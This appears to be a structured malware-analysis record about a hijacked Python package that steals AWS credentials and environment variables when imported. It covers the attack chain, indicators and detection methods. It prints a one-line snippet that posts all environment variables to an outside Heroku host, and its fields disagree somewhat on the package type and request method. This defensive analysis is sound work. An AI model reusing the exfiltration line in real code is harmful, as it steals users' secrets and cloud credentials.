package_info.package_versions: Malicious versions published after May 19, 2022 (exact versions not specified)
package_info.why_malicious: The package was hijacked via RepoJacking after the original maintainer's GitHub account was deleted. The attacker published new versions containing code that exfiltrates AWS credentials from environment variables to an external server, while preserving original functionality to evade detection.

malicious_snippets.code_behavior: At import-time, the code accesses the AWS_ACCESS_KEY_ID and AWS_SECRET_ACCESS_KEY environment variables and sends their values to a hardcoded external domain via HTTP GET, enabling credential exfiltration.

malice_analysis.why_suspicious: Accessing AWS credentials and exfiltrating them to an external server is a clear sign of credential theft.
malice_analysis.violated_expectations: Normal password hashing libraries should never access cloud credentials or perform unsolicited network requests.
malice_analysis.similar_legitimate_use: Legitimate code may access environment variables for configuration, but should never transmit secrets externally.
key_indicators: Access to AWS credential environment variables
Network request to an untrusted external domain

malicious_snippets.code_snippet:
# Pseudocode based on report
import os, requests
requests.post('http://anti-theft-web.herokuapp.com/hacked', data=os.environ)
malicious_snippets.code_behavior: At import-time, the code collects all environment variables and sends them to a hardcoded external domain via HTTP POST, enabling mass credential exfiltration.

malice_analysis.why_suspicious: Harvesting all environment variables and exfiltrating them is a common technique for stealing secrets, tokens, and credentials.
malice_analysis.violated_expectations: Normal data structure manipulation libraries should not access or transmit environment variables.
malice_analysis.similar_legitimate_use: Environment variables may be logged for debugging, but never sent to external servers.

attack_chain.action: Attacker hijacks abandoned or renamed package repositories using RepoJacking or Account Takeover.
attack_chain.leads_to: Ability to publish malicious package versions

attack_chain.action: Attacker publishes new package versions containing malicious code that exfiltrates secrets.
attack_chain.leads_to: Malicious code is distributed to unsuspecting users

attack_chain.action: When the package is installed or imported, the malicious code executes, harvesting environment variables and exfiltrating them to the attacker's server.
attack_chain.leads_to: Attacker receives sensitive credentials (e.g., AWS keys, tokens)

behavioral_signatures: Access to sensitive environment variables (e.g., AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY)
Unsolicited network requests to external domains during import or initialization
Exfiltration of environment variables or secrets
file_indicators: Unexpected code in constructors or __init__ methods accessing environment variables
References to external domains in source code (e.g., anti-theft-web.herokuapp.com)
network_indicators: Outbound connections during package import or install
detection_knowledge.how_to_detect: Monitor for packages that access sensitive environment variables and make network requests to untrusted domains during installation or import. Use static analysis to flag code that references known exfiltration endpoints or bulk accesses os.environ. Network monitoring can detect suspicious outbound connections to domains like anti-theft-web.herokuapp.com.
